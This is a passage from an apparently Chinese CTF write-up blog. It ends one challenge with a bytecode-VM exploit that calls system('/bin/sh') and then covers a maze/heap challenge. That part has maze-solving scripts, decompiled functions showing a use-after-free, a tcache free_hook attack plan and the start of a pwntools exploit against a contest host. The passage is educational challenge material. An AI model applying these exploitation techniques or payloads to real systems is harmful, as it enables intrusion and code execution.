class="string">&quot;&lt;bbb&quot;</span>, <span class="number">1</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x02</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">2</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x03</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_reg</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">3</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x04: push</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">4</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x05: pop</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">5</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x06: call</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_call</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">6</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x08: exit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_vm</span>():</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;b&quot;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0a: add</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xA</span>, reg, num)<span class="comment">#num要用做地址计算，用8字节类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0b: sub</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xB</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先获得data段0x4008的地址此处指向是base+0x4008，可以间接计算got</span></span><br><span class="line">payload = load_indirect(-<span class="number">11</span>, <span class="number">1</span>) + sub_num(<span class="number">1</span>, <span class="number">0x50</span>) + load_indirect(<span class="number">1</span>, <span class="number">0</span>) + sub_num(<span class="number">0</span>, libc.sym[<span class="string">&quot;malloc&quot;</span>]) + mov_reg(<span class="number">0</span>, <span class="number">2</span>) </span><br><span class="line">payload += add_num(<span class="number">2</span>, libc.sym[<span class="string">&quot;system&quot;</span>]) + add_num(<span class="number">0</span>, <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))) + func_call(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#payload += exit_vm()</span></span><br><span class="line"><span class="comment">#debug(&quot;b *$rebase(0x14F3)\nb *$rebase(0x15ac)&quot;)</span></span><br><span class="line">sla(<span class="string">&quot;bytecode: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="迷途之子"><a href="#迷途之子" class="headerlink" title="迷途之子"></a>迷途之子</h2><h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_maze</span>():</span><br><span class="line">    start_addr = <span class="number">0x4040</span>  <span class="comment"># 迷宫起始地址</span></span><br><span class="line">    size = <span class="number">0x10000</span>       <span class="comment"># 256x256=65536字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取二进制数据</span></span><br><span class="line">    maze_data = idc.get_bytes(start_addr, size)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;maze.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(maze_data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Maze dumped to maze.bin (<span class="subst">&#123;size&#125;</span> bytes)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dump_maze()</span><br></pre></td></tr></table></figure>

<p>可以得到二进制文件maze.bin，然后通过下面脚本可以获取maze.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;maze.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    maze = f.read()</span><br><span class="line"></span><br><span class="line">width = <span class="number">256</span></span><br><span class="line">height = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;maze.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        row = maze[y*width:(y+<span class="number">1</span>)*width]</span><br><span class="line">        out.write(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> c != <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> row]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="BFS算法走到终点"><a href="#BFS算法走到终点" class="headerlink" title="BFS算法走到终点"></a>BFS算法走到终点</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_maze</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从文件中读取迷宫数据&quot;&quot;&quot;</span></span><br><span class="line">    maze = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="comment"># 去除换行符和空格，只保留01字符</span></span><br><span class="line">                cleaned_line = line.strip().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="comment"># 跳过空行</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(cleaned_line) &gt; <span class="number">0</span>:</span><br><span class="line">                    maze.append(cleaned_line)</span><br><span class="line">        <span class="keyword">return</span> maze</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：文件&#x27;<span class="subst">&#123;filename&#125;</span>&#x27;未找到&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bfs_solve_maze</span>(<span class="params">maze</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用BFS算法解决迷宫问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 验证迷宫有效性</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> maze <span class="keyword">or</span> <span class="built_in">len</span>(maze) &lt; <span class="number">129</span> <span class="keyword">or</span> <span class="built_in">len</span>(maze[<span class="number">0</span>]) &lt; <span class="number">129</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：迷宫尺寸不足或数据无效&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    rows = <span class="built_in">len</span>(maze)</span><br><span class="line">    cols = <span class="built_in">len</span>(maze[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义起点(0,0)和终点(128,128)</span></span><br><span class="line">    start = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    end = (<span class="number">128</span>, <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查起点和终点合法性</span></span><br><span class="line">    <span class="keyword">if</span> (maze[start[<span class="number">1</span>]][start[<span class="number">0</span>]] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span>   <span class="comment"># 注意坐标是(x,y)，maze[y][x]</span></span><br><span class="line">        maze[end[<span class="number">1</span>]][end[<span class="number">0</span>]] != <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：起点或终点不可达&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># BFS初始化</span></span><br><span class="line">    queue = deque()</span><br><span class="line">    queue.append( (start[<span class="number">0</span>], start[<span class="number">1</span>], <span class="string">&quot;&quot;</span>) )  <span class="comment"># (x, y, path)</span></span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    visited.add( (start[<span class="number">0</span>], start[<span class="number">1</span>]) )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移动方向定义（wasd对应标准方向键）</span></span><br><span class="line">    directions = [</span><br><span class="line">        (<span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>, -<span class="number">1</span>),  <span class="comment"># 上</span></span><br><span class="line">        (<span class="string">&#x27;s&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>),   <span class="comment"># 下</span></span><br><span class="line">        (<span class="string">&#x27;a&#x27;</span>, -<span class="number">1</span>, <span class="number">0</span>),  <span class="comment"># 左</span></span><br><span class="line">        (<span class="string">&#x27;d&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>)    <span class="comment"># 右</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行BFS搜索</span></span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        x, y, path = queue.popleft()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 到达终点</span></span><br><span class="line">        <span class="keyword">if</span> x == end[<span class="number">0</span>] <span class="keyword">and</span> y == end[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历所有可能方向</span></span><br><span class="line">        <span class="keyword">for</span> direction <span class="keyword">in</span> directions:</span><br><span class="line">            move, dx, dy = direction</span><br><span class="line">            nx = x + dx</span><br><span class="line">            ny = y + dy</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 验证新位置有效性</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt;= nx &lt; cols <span class="keyword">and</span> </span><br><span class="line">                <span class="number">0</span> &lt;= ny &lt; rows <span class="keyword">and</span></span><br><span class="line">                maze[ny][nx] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> </span><br><span class="line">                (nx, ny) <span class="keyword">not</span> <span class="keyword">in</span> visited):</span><br><span class="line">                </span><br><span class="line">                visited.add( (nx, ny) )</span><br><span class="line">                queue.append( (nx, ny, path + move) )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 无解情况</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取迷宫文件</span></span><br><span class="line">    maze = read_maze(<span class="string">&#x27;maze.txt&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> maze:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解决迷宫问题</span></span><br><span class="line">    solution = bfs_solve_maze(maze)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> solution:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;找到解决方案！操作序列：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法到达终点&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="find-py"><a href="#find-py" class="headerlink" title="find.py"></a>find.py</h3><p>从任意x,y走向任意a,b所需的步的记录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_maze</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        maze = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> <span class="built_in">len</span>(line.strip()) == <span class="number">256</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(maze) != <span class="number">256</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid maze dimensions&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> maze</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">maze, start, end</span>):</span><br><span class="line">    directions = &#123;</span><br><span class="line">        <span class="string">&#x27;w&#x27;</span>: (<span class="number">0</span>, -<span class="number">1</span>), </span><br><span class="line">        <span class="string">&#x27;s&#x27;</span>: (<span class="number">0</span>, <span class="number">1</span>),   </span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: (-<span class="number">1</span>, <span class="number">0</span>),  </span><br><span class="line">        <span class="string">&#x27;d&#x27;</span>: (<span class="number">1</span>, <span class="number">0</span>)    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    visited = [[<span class="literal">False</span>]*<span class="number">256</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    q = deque()</span><br><span class="line">    q.append((start[<span class="number">0</span>], start[<span class="number">1</span>], []))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> q:</span><br><span class="line">        x, y, path = q.popleft()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (x, y) == end:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> move, (dx, dy) <span class="keyword">in</span> directions.items():</span><br><span class="line">            nx = x + dx</span><br><span class="line">            ny = y + dy</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= nx &lt; <span class="number">256</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= ny &lt; <span class="number">256</span>:</span><br><span class="line">                <span class="keyword">if</span> maze[ny][nx] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> visited[ny][nx]:</span><br><span class="line">                    visited[ny][nx] = <span class="literal">True</span></span><br><span class="line">                    q.append((nx, ny, path + [move]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 坐标转换（注意y坐标对应行号）</span></span><br><span class="line">start_x = <span class="number">0xd0</span></span><br><span class="line">start_y = <span class="number">0x92</span></span><br><span class="line">end_x = <span class="number">0xda</span> <span class="comment">#da</span></span><br><span class="line">end_y = <span class="number">0x92</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    maze = read_maze(<span class="string">&quot;maze.txt&quot;</span>)</span><br><span class="line">    path = find_path(maze, (start_x, start_y), (end_x, end_y))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found path:&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(path))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No path found&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="game"><a href="#game" class="headerlink" title="game()"></a>game()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">start_game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+Bh] [rbp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 chunk0; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 chunk0_1; <span class="comment">// [rsp+Dh] [rbp-13h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 x; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 y; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *chunk0_ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  chunk0_ptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( users[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk0_ptr = users[<span class="number">0</span>];                      <span class="comment">// chunk0_ptr</span></span><br><span class="line">    chunk0 = *users[<span class="number">0</span>];                         <span class="comment">// 0xd0</span></span><br><span class="line">    chunk0_1 = *(users[<span class="number">0</span>] + <span class="number">1</span>);                 <span class="comment">// 0x92</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Game started! (WASD to move, Q to quit)\n&quot;</span>, <span class="number">0x27u</span>LL);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">      x = chunk0;</span><br><span class="line">      y = chunk0_1;</span><br><span class="line">      <span class="keyword">switch</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( x )</span><br><span class="line">            --x;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( x != <span class="number">0xFF</span> )</span><br><span class="line">            ++x;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">          <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v7;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( y != <span class="number">0xFF</span> )</span><br><span class="line">            ++y;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> ( y )</span><br><span class="line">            --y;</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="keyword">if</span> ( !maze[<span class="number">256</span> * y + x] )</span><br><span class="line">          &#123;</span><br><span class="line">            chunk0 = x;<span class="comment">//在这里会向chunk0的fd最低一字节处写值</span></span><br><span class="line">            chunk0_1 = y;<span class="comment">//在这里会向chunk0的fd最低二字节处写值</span></span><br><span class="line">            *chunk0_ptr = x;</span><br><span class="line">            chunk0_ptr[<span class="number">1</span>] = chunk0_1;</span><br><span class="line">            <span class="keyword">if</span> ( chunk0 == goal_x &amp;&amp; chunk0_1 == goal_y )</span><br><span class="line">              gift();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="del"><a href="#del" class="headerlink" title="del()"></a>del()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">del_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Index: &quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Invalid index.\n&quot;</span>, <span class="number">0xFu</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !used_flags[v1] )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User not exists.\n&quot;</span>, <span class="number">0x11u</span>LL);</span><br><span class="line">  <span class="built_in">free</span>(users[v1]);                              <span class="comment">// uaf</span></span><br><span class="line">  used_flags[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User deleted.\n&quot;</span>, <span class="number">0xEu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里虽然说置零了，但指令的不是free的那个指针，存在uaf</p>
<h4 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">add_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *user; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User limit reached.\n&quot;</span>, <span class="number">0x14u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !used_flags[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  user = <span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !user )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Allocation failed.\n&quot;</span>, <span class="number">0x12u</span>LL);</span><br><span class="line">  *user = <span class="number">0</span>;</span><br><span class="line">  user[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Enter name (up to 24 chars): &quot;</span>, <span class="number">0x1Cu</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, user + <span class="number">8</span>, <span class="number">0x18u</span>LL);</span><br><span class="line">  users[i] = user;</span><br><span class="line">  used_flags[i] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;User added.\n&quot;</span>, <span class="number">0xCu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有溢出，且只能向bk指针处写值</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit()"></a>edit()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Index: &quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Invalid index.\n&quot;</span>, <span class="number">0xFu</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;New name: &quot;</span>, <span class="number">0xAu</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, (users[v1] + <span class="number">8</span>), <span class="number">0x18u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Name updated.\n&quot;</span>, <span class="number">0xEu</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样没有溢出，且只能向bk指针处写值</p>
<h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>漏洞只有uaf，且没有溢出</p>
<p>我们要打就要考虑如何将free_hook等链入tcachebins中</p>
<p>思路：</p>
<ul>
<li>首先要通过游戏，拿到gift()中的read地址，计算出libc_base</li>
<li>申请3个chunk，并将free掉，通过game()向chunk0的fd低字节处写值</li>
<li>写值的地址哪里填上free_hook的地址，然后就好说了</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">22000</span>)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span 